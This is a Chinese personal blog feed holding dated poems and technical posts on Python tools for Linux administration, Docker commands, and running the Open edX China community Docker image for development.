卧听鸟语过长廊，
庭院树阴凉覆窗。
睡意来时惊坐起，
闲读尤恐负韶光

紫金山脚，寻萤火虫去（15.07.04） 
听闻山脚有流萤，
长发青裙脚步轻。
时有晚风湍似水，
一池灯火碎如星。

昨晚睡得早，半夜醒来，《一一》中的情节历历在目(15.05.18)

其一
夜深能有鬼，
最好笑藏刀。
听其说恩怨，
听久又无聊。

其二
夜深知有雨，
无梦到三更。
光阴轻蚀骨，
痛哭都不能。

周末早晨醒来，大雨（15.05.02）
窗外大雨，
我拉过被子，
滚了两圈，
裹成了春卷，
把自己作为早餐
等待屋檐下避雨的时间，
前来吞噬。

骑车途中（15.05.01）
何须加滤镜，
天气艳如书。
春风在耳后，
挑逗近轻浮。

周末两首(15.04.27)

其一
渭水之南草木青，
山坡柔软近呆萌。「注」
帐中假寐闻妖气，
使我智商降到零。
注：想到「挪威的森林」与小熊滚山坡的故事

其二
头顶繁星应不远，
城中灯火渐如萤。
身侧悬崖肯一跃，
可能相遇任盈盈。


扬州雨中(15.04.05)
初生春水漫篱笆，
春雨来时堪煮茶。「1」
纵使青楼春梦好，
牧之应恨负樱花。
注1：陆羽《茶经》好像说过无根之水煮茶逼格最高好像

快要下雨的玄武湖(15.03.15)
山色有无间，
江南细雨前。
樱花媚如梦，
柳叶绿初甜。
微风来阵阵，
长发欲翩翩。
此间闲一日，
今夕忘何年。

临江仙  辞旧 (15.02.18)
风物江南多养眼，
谋生不必焚琴。
霾和思念偶相侵。
可能明月好，
灯火暖如唇。

行迹此前多任性，
千金敢作浮云。
人间窃得一人心。
从今生软肋，
此后惧光阴。

给途中的小伙伴(15.01.30)
访戴途中梦正酣？
兰舟昨夜遇贼船？
下酒菜吾皆已备，
漫天雪与六朝山。

收到封久没联系朋友的邮件(14.12.23)
我这半年
惭愧半年音讯无
溺于风景溺于书
岁渐寒时梦渐少
可能相忘在江湖
————————
今夜窗前月色同
路千里且山千重
旧友新年真可待
相逢惊艳我刀功

借了本书，在图书馆旁边草地上看了半个下午(14.09.21)
重来蝉未了，
银杏叶初黄。
袖短知秋近，
风轻闻桂香。
暂无事相扰，
且有书身旁。
恍然解法妙，
掩卷看夕阳

近期计划(14.08.03)
未戒知乎手可剁，
耽搁长跑便削足。
夜色深时尤未睡，
明朝自刎莫愁湖。

&lt;/pre&gt;
&lt;/div&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 21 Oct 2015 00:00:00 +0000</pubDate><guid>tag:,2015-10-21:2015-my-poem.html</guid><category>诗词</category></item><item><title>Python与系统日常管理</title><link>/Python-for-system-administrators.html</link><description>&lt;p&gt;大多时间都在linux下工作，虽说不算系统管理员，也免不了要处理许多系统相关的东西。对linux还算熟悉，偶尔也在公司客串系统管理员的角色。于是就免不了要写许多自动化脚本的东西，来方便系统日常管理了。&lt;/p&gt;
&lt;p&gt;bash脚本挺让人恶心的，属于dirty and quick一类。而Python语法清新可人，Python与系统的交互也极其便利，写自动化脚本再合适不过。&lt;/p&gt;
&lt;p&gt;在此就分享些自己在写自动化脚本时中意的Python工具：&lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;build-in&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;glob:文件名的匹配,比如 &lt;ul&gt;
&lt;li&gt;glob.glob('somedir/*.py')&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;subprocess&lt;ul&gt;
&lt;li&gt;启动一个子进程建议的方式是使用下面的便捷函数:subprocess.call(args, *, stdin=None, stdout=None, stderr=None, shell=False)&lt;ul&gt;
&lt;li&gt;subprocess.call(["ls", "-l"])&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;对于更高级的使用场景当它们不能满足你的需求时，可以使用底层的Popen接口。&lt;/li&gt;
&lt;li&gt;subprocess.call(["sed", "-i", "-e",  's/hello/helloworld/g', "www.txt"])&lt;/li&gt;
&lt;li&gt;单行：subprocess.call(["sed -i -e 's/hello/helloworld/g' www.txt"], shell=True)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a href="https://github.com/amoffat/sh"&gt;sh&lt;/a&gt;&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;sh is a full-fledged subprocess replacement for Python 2.6 - 3.4 that allows you to call any program as if it were a function&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;使用sh可以用 Python 函数的语法去调用 shell 命令，比subprocess舒服多了&lt;/p&gt;
&lt;p&gt;有了sh，就可以方便地用python写逻辑，而与系统的交互依然使用shell指令&lt;/p&gt;
&lt;p&gt;sh并没有自己去实现一遍系统指令(也不现实)，sh的原理很有趣，是通过ModuleType来实现的。有兴趣的同学可以参考源码&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;sh&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;tail&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;process_log_line&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ERROR&amp;quot;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;send_an_email_to_support&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;process&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;tail&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;-f&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;info.log&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;_out&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;process_log_line&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c1"&gt;# ... do other stuff here ...&lt;/span&gt;

&lt;span class="n"&gt;process&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;wait&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;&lt;a href="https://github.com/jaraco/path.py"&gt;path.py&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;简化文件系统相关操作。与文件系统的相关操作，在python中有些分散，path.py把它们聚合在一个类文件对象里&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;path.py implements a path objects as first-class entities, allowing common operations on files to be invoked on those path objects directly&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;path&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Path&lt;/span&gt;
&lt;span class="n"&gt;d&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Path&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/home/guido/bin&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;files&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;*.py&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;chmod&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mo"&gt;0755&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;&lt;a href="https://github.com/gorakhargosh/watchdog"&gt;Watchdog&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;监视文件系统改动.事件驱动真是适合用来写监控逻辑啊&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Python library and shell utilities to monitor filesystem events&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;可以在python中使用，也提供shell指令&lt;/p&gt;
&lt;h3&gt;&lt;a href="https://github.com/Russell91/pythonpy"&gt;pythonpy&lt;/a&gt;&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;the swiss army knife of the command line&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;让python更方便与shell配合使用，行为更像过滤器&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;ls&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;py&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;quot;mv `&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt;` `&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt;.txt`&amp;quot; % (x,x)&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;sh&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;&lt;a href="https://github.com/giampaolo/psutil"&gt;psutil&lt;/a&gt;&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;A cross-platform process and system utilities module for Python&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;方便用来查看系统信息（CPU, memory, disks, network）&lt;/p&gt;
&lt;h3&gt;&lt;a href="https://github.com/fabric/fabric"&gt;Fabric&lt;/a&gt;&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Simple, Pythonic remote execution and deployment.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;自动化运维工具，也可用于自动化本地任务，本地机器无非也只是一个普通的host&lt;/p&gt;
&lt;h3&gt;&lt;a href="https://github.com/ansible/ansible"&gt;ansible&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;大大有名的自动化运维工具，热度已远超Fabric，当部署环境巨复杂是，ansible playbook就是救星了。当然学习成本也是在不低，edX就是用它来自动化部署的，有700+ task好像&lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;用户身份与进程权限&lt;/h1&gt;
&lt;p&gt;顺便提一下用户身份与进程权限，python脚本中与系统交互（操作文件等），必然涉及到权限问题，所以我们需要了解linux的权限机制&lt;/p&gt;
&lt;p&gt;linux中，子进程将继承了父进程的所有权限&lt;/p&gt;
&lt;p&gt;当Linux加载内核文件以后，就开始运行第一个程序 /sbin/init，它的作用是初始化系统环境，init是第一个运行的程序，它的进程编号（pid）为1。其他所有进程都从它衍生，都是它的子进程。init进程在运行各种开机启动的程序之后，会执行一个login的子进程。我们将用户名和密码传递给login子进程。login在查询了/etc/passwd和/etc/shadow，并确定了其合法性之后，运行(利用exec)一个shell进程，shell进程有效身份被设置成为该用户的身份。&lt;/p&gt;
&lt;p&gt;终于轮到我们的python进程登场啦，python进程从shell中启动，&lt;code&gt;python权限为执行它的用户的权限，此后python中调用的shell指令则为python的子进程，权限与python相同&lt;/code&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sat, 17 Oct 2015 00:00:00 +0000</pubDate><guid>tag:,2015-10-17:Python-for-system-administrators.html</guid><category>技术</category></item><item><title>使用Open edX中国社区Docker版来开发调试edX</title><link>/edx-cypress-cn-for-deveiopment.html</link><description>&lt;blockquote&gt;
&lt;p&gt;If you build it, they will come&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Open edX中国社区Docker版，以下简称edx_cypress_docker。&lt;/p&gt;
&lt;p&gt;关于如何安装使用，可以参考&lt;a href="http://wwj718.github.io/edx-cypress-cn-install-and-use.html"&gt;Open edX中国社区Docker版安装使用&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;该版本为两个目的服务：&lt;code&gt;演示和开发&lt;/code&gt;，演示部分在以上文章中谈了，这篇文章谈论如何使用它来开发调试edX&lt;/p&gt;
&lt;h2&gt;预备技能&lt;/h2&gt;
&lt;p&gt;假设你已经基本熟悉&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Python(Django/Mako)&lt;/li&gt;
&lt;li&gt;js(backbone.js/requre.js)&lt;/li&gt;
&lt;li&gt;Linux(Ubuntu)&lt;/li&gt;
&lt;li&gt;edX&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;edX开发调试概述&lt;/h2&gt;
&lt;p&gt;调试edX是一件门槛不算低的事，而且这件事与使用docker或是vagrant或是直接在生产环境里调试关系不大，因为调试的方法和思路都是相似的，具体细节在&lt;a href="https://github.com/edx/configuration/wiki/edX-Developer-Stack"&gt;edX Developer Stack&lt;/a&gt;中有谈及&lt;/p&gt;
&lt;p&gt;使用Pycharm来调试的小伙伴可以看这里:&lt;a href="https://github.com/edx/edx-platform/wiki/Setting-up-PyCharm-for-edX-development"&gt;Setting up PyCharm for edX development&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;社区计划&lt;/h3&gt;
&lt;p&gt;为了降低edX的开发门槛，让新手在上手时能顺畅些，不必过多地关心细节，我们想借用&lt;code&gt;一键运行&lt;/code&gt;的概念，把一些常用的调试指令做成可执行文件，例如将start lms的复杂指令&lt;code&gt;sudo -u www-data /edx/bin/python.edxapp /edx/app/edxapp/edx-platform-dev/manage.py lms runserver 0.0.0.0:5000 --settings devstack&lt;/code&gt;变为&lt;code&gt;/edx_dev/start_lms&lt;/code&gt;,诸如此类，让新手在入手之初，能快速把开发环境跑起来，待熟悉之后再关注细节，我们想为新手打造一个抽象屏障，使其快速进入edx的开发状态。类似的便捷指令我们正在持续添加中。&lt;/p&gt;
&lt;p&gt;类似的工作刚刚起步，也期待你的反馈，收集大家都需要怎样的帮助&lt;/p&gt;
&lt;h3&gt;Why Docker&lt;/h3&gt;
&lt;p&gt;之所以使用docker来作为开发环境，主要基于以下原因：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;相比vagrant更轻量&lt;/li&gt;
&lt;li&gt;只要docker pull和git clone 就可以快速在Windows/Linux/Mac/云平台立马开始开发。&lt;/li&gt;
&lt;li&gt;由于消耗资源少（1G单核便可），你甚至可以将系统写到U盘中，这样一来，可以把整个edx开发环境装到一个U盘里&lt;/li&gt;
&lt;li&gt;docker镜像层级的概念，十分利于迭代开发，而且易于分发和团队协作&lt;/li&gt;
&lt;li&gt;面向未来，edX官方的开发环境也在往docker迁移，此次edX国际会议（第二次）中有一个黑客马拉松的主题便是这个&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;使用Docker来开发的思路&lt;/h3&gt;
&lt;p&gt;以下内容可能有些抽象，可以先跳过直接看后边的Workflow&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;最核心的观念是把docker容器当做edx的运行环境，将其视为无状态最好。&lt;/li&gt;
&lt;li&gt;习惯vim/ipython调试的同学直接ssh进去就好&lt;/li&gt;
&lt;li&gt;使用Pycharm开发的话，只需要把&lt;a href="http://blog.jetbrains.com/pycharm/2013/03/how-pycharm-helps-you-with-remote-development/"&gt;remote Python interpreters&lt;/a&gt;指向docker中的&lt;code&gt;/edx/app/edxapp/venvs/edxapp/bin/python&lt;/code&gt;即可&lt;/li&gt;
&lt;li&gt;开发过程中代码的变化和保存使用git来管理，源代码在docker外部，使用-v参数把目录挂载到容器里&lt;/li&gt;
&lt;li&gt;开发过程中如果需要改变容器本身(改变系统环境)，则将这些变化写入Dockerfile中，build出新版本的image，分发给团队成员(push,pull)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Workflow&lt;/h3&gt;
&lt;p&gt;以我自己为例，在Ubuntu14.04中开发，系统中已经安装好docker了&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;克隆(复制)你定制的edx-platform源码到docker所在机器里（mac/windows用户的docker可能在虚拟机里）&lt;ul&gt;
&lt;li&gt;示例：&lt;code&gt;git clone -b edx_cn/cypress_cn https://github.com/easy-edx/edx-platform.git ~/edx-platform&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;将开发环境跑起来&lt;/li&gt;
&lt;li&gt;示例: &lt;code&gt;sudo docker run -itd -p 5000:5000 -p 5010:5010 -p 2022:22 -v ~/edx-platform:/edx/app/edxapp/edx-platform-dev wwj718/edx_cypress_docker:1.11&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;进入到docker中（docker exec）,启动lms/cms,多任务的适合建议使用tmux来管理窗口&lt;/li&gt;
&lt;li&gt;示例: &lt;code&gt;/edx_dev/start_lms&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;开发调试完成后，回到docker宿主机，将edx-platform代码的变更提交到远程仓库&lt;/li&gt;
&lt;li&gt;cd   ~/edx-platform&lt;/li&gt;
&lt;li&gt;git add .&lt;/li&gt;
&lt;li&gt;git commit -m 'your message'&lt;/li&gt;
&lt;li&gt;git push origin edx_cn/cypress_cn:edx_cn/cypress_cn&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;社区协作&lt;/h3&gt;
&lt;h5&gt;思路&lt;/h5&gt;
&lt;p&gt;以edx-platform源码库和edx_cypress_docker为中心，接受bug提交，Issues，Pull requests&lt;/p&gt;
&lt;h5&gt;源码库&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/easy-edx/edx-platform"&gt;edx-platform源码库&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/wwj718/edx_cypress_docker"&gt;edx_cypress_docker源码库&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;qq群&lt;/h5&gt;
&lt;p&gt;106781163&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sat, 17 Oct 2015 00:00:00 +0000</pubDate><guid>tag:,2015-10-17:edx-cypress-cn-for-deveiopment.html</guid><category>edx</category></item><item><title>docker使用小结</title><link>/docker-summary.html</link><description>&lt;h1&gt;安装&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.docker.com/installation/"&gt;官方文档&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;国内用户推荐使用&lt;a href="http://get.daocloud.io/"&gt;get.daocloud.io&lt;/a&gt;来方便安装docker&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;确保docker运行正常：&lt;code&gt;docker run hello-world&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;卸载&lt;/h3&gt;
&lt;p&gt;针对使用wget安装的&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo apt-get purge docker-engine
sudo apt-get autoremove --purge docker-engine
rm -rf /var/lib/docker
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;设置&lt;/h1&gt;
&lt;h3&gt;修改docker存储目录&lt;/h3&gt;
&lt;p&gt;ubuntu : /etc/default/docker ,使得：DOCKER_OPTS="-g /somewhere/else/docker/"&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo service docker stop
sudo cp -r /var/lib/docker /somewhere/else/docker &lt;span class="c1"&gt;#/somewhere/else/docker目录本来不存在&lt;/span&gt;
sudo service docker restar
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;centos参考这里:&lt;a href="https://github.com/docker/docker/issues/3127"&gt;Best way to move docker directory&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;通过修改配置，可以让docker远程可访问&lt;/p&gt;
&lt;p&gt;/etc/default/docker &lt;/p&gt;
&lt;h1&gt;使用&lt;/h1&gt;
&lt;p&gt;所有的指令示意图可参考：&lt;/p&gt;
&lt;p&gt;&lt;img alt="all_command" src="img/edx/docker/all_command.jpeg" /&gt;&lt;/p&gt;
&lt;p&gt;列出docker的常用指令,主要便于参考,(以下命令可能需要带上sudo),其实我日常使用的基本只有4-5条&lt;/p&gt;
&lt;p&gt;&lt;code&gt;docker version&lt;/code&gt; : 可用于查看docker是否安装完成&lt;/p&gt;
&lt;h2&gt;对image的操作&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;docker search image_name : 在docker hub上搜索镜像&lt;/li&gt;
&lt;li&gt;docker pull image_name:tag_name : 拉取镜像&lt;/li&gt;
&lt;li&gt;docker images : 列出镜像列表&lt;/li&gt;
&lt;li&gt;docker rmi image_name : 删除镜像&lt;/li&gt;
&lt;li&gt;docker history image_name : 显示镜像的历史&lt;/li&gt;
&lt;li&gt;docker inspect image_name : 检查镜像底层信息，json化输出&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;保存和加载镜像&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;docker save ubuntu:latest &amp;gt; ubuntu_save.tar : 保存镜像到一个tar包&lt;/li&gt;
&lt;li&gt;docker load &amp;lt; ubuntu_save.tar : 加载一个tar包格式的镜像(之后的镜像信息都在，包括名字)&lt;/li&gt;
&lt;li&gt;sudo docker export &lt;CONTAINER ID&gt; &amp;gt; ubuntu_export.tar : 保存容器到一个tar包&lt;/li&gt;
&lt;li&gt;cat ubuntu_export.tar | docker import - wwj/ubuntu : 加载容器到一个印象&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;save和export的区别:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Export命令用于持久化容器（不是镜像） (sudo docker ps列出容器）&lt;/li&gt;
&lt;li&gt;Save命令用于持久化镜像（不是容器）(sudo docker images列出镜像)&lt;/li&gt;
&lt;li&gt;The exported image will not have any layer or history information saved, so it will be smaller and you will not be able to rollback&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;发布image&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;docker push image_name &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;对container的操作&lt;/h2&gt;
&lt;h3&gt;启动容器（run）&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;sudo docker run [OPTIONS] IMAGE[:TAG] [COMMAND] [ARG...]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;好比我通常使用edx_cypress_docker时时这样run的：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sudo docker run -itd -P wwj718/edx_cypress_docker:1.05&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;其中：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;-d:后台模式&lt;/li&gt;
&lt;li&gt;-i -t参数是为了同容器进行数据交互&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;可选：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;--rm : Docker能在容器结束时自动清理其所产生的数据&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;更多的使用细节参考&lt;a href="http://dockone.io/article/152"&gt;Docker run 命令的使用方法&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;查看容器（ps）&lt;/h2&gt;
&lt;p&gt;docker ps&lt;/p&gt;
&lt;h3&gt;对容器的日常操作&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;docker commit ID image_name:tag_name&lt;/li&gt;
&lt;li&gt;docker rm -f $(docker ps -aq) : 删除所有容器&lt;/li&gt;
&lt;li&gt;docker rm Name/ID : 删除单个容器&lt;/li&gt;
&lt;li&gt;docker kill Name/ID : kill一个容器&lt;/li&gt;
&lt;li&gt;docker restart Name/ID : 重启一个正在运行的容器&lt;/li&gt;
&lt;li&gt;docker logs Name/ID : 从一个容器中取日志&lt;/li&gt;
&lt;li&gt;docker diff Name/ID : 列出一个容器里面被改变的文件或者目录&lt;/li&gt;
&lt;li&gt;docker top Name/ID : 显示一个运行的容器里面的进程信息&lt;/li&gt;
&lt;li&gt;docker cp Name:/container_path to_path : 从容器里面拷贝文件/目录到本地一个路径&lt;/li&gt;
&lt;li&gt;docker exec Name/ID /bin/bash&lt;/li&gt;
&lt;li&gt;exec与attach的区别参考&lt;a href="http://stackoverflow.com/questions/30960686/difference-between-docker-attach-and-docker-exec"&gt;这里&lt;/a&gt;     &lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Dockerfile&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.docker.com/reference/builder/"&gt;Dockerfile reference&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.oschina.net/news/64396/dockerfile-instructions"&gt;Dockerfile 简版大全，附赠编写实例&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;相关服务&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://hub.docker.com/"&gt;docker hub&lt;/a&gt;:docker官方镜像托管，支持在线Build&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;学习资料&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://dockerpool.com/static/books/docker_practice/index.html"&gt;Docker —— 从入门到实践&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;手册&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/wsargent/docker-cheat-sheet"&gt;docker-cheat-sheet&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.tedblog.cc/wordpress/?p=49"&gt;docker使用小结&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 13 Oct 2015 00:00:00 +0000</pubDate><guid>tag:,2015-10-13:docker-summary.html</guid><category>tools</category></item><item><title>Open edX中国社区Docker版安装使用</title><link>/edx-cypress-cn-install-and-use.html</link><description>&lt;blockquote&gt;
&lt;p&gt;当开始建设社区的时候，你需要拿出一个像样的承诺。程序此时并不需要特别好，它可以简陋、有错、不完整，文档可以少得可怜。但它至少要做到：(a)能运行，(b)让潜在的合作开发者相信，这个软件在可预见的未来，能演变成一个非常棒的东西  --《大教堂与集市》&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;国内社区&lt;/h1&gt;
&lt;p&gt;Open edX中国社区的计划和愿景可以参考这里：&lt;a href="https://github.com/edx/edx-platform/wiki/localization-and-development-in-china"&gt;Open edX中国社区&lt;/a&gt;。  &lt;/p&gt;
&lt;p&gt;第一次筹备会计划：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;社区将发布基于Docker的Open edX国内版本（开发演示版）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Open edX开发研究群qq号为：106781163。 欢迎大家前来交流,一起来完善社区版本 : ）&lt;/p&gt;
&lt;h1&gt;版本概述&lt;/h1&gt;
&lt;p&gt;当前版本使用docker发布，跨平台，支持Windows/Linux/Mac，用于开发与演示，基于appsembler发布的edx-lite-cypress。&lt;/p&gt;
&lt;p&gt;当前版本对系统要求很低，在Ubuntu14.04下实验，使用的机器为单核1G内存，运行流畅&lt;/p&gt;
&lt;p&gt;社区计划以小版本的方式迭代优化。目前已支持以下特性：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;同时支持演示和开发，默认开启lms，studio，forum&lt;/li&gt;
&lt;li&gt;支持脚本化化主题切换（一条指令切换到自适应主题，对移动端访问友好），&lt;/li&gt;
&lt;li&gt;默认配置好邮件服务&lt;/li&gt;
&lt;li&gt;默认汉化&lt;/li&gt;
&lt;li&gt;支持ssh登录(root:edx)，方便开发&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;计划增加的特性：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;增强开发环境，大体效果参考&lt;a href="http://wwj718.github.io/docker-edx-birch-1.html"&gt;这里&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;更全面的本地化，包括CDN的优化等&lt;/li&gt;
&lt;li&gt;解决国内使用edX可能遇到的坑&lt;/li&gt;
&lt;li&gt;更多的Xblock组件，诸如优酷，腾讯云视频组件&lt;/li&gt;
&lt;li&gt;更多的主题&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;项目细节和进展欢迎围观:&lt;a href="https://github.com/wwj718/edx_cypress_docker"&gt;edx_cypress_docker&lt;/a&gt;,欢迎提issue,欢迎pull requests，欢迎fork&lt;/p&gt;
&lt;p&gt;docker hub地址为&lt;a href="https://hub.docker.com/r/wwj718/edx_cypress_docker/"&gt;wwj718/edx_cypress_docker&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;Install&lt;/h1&gt;
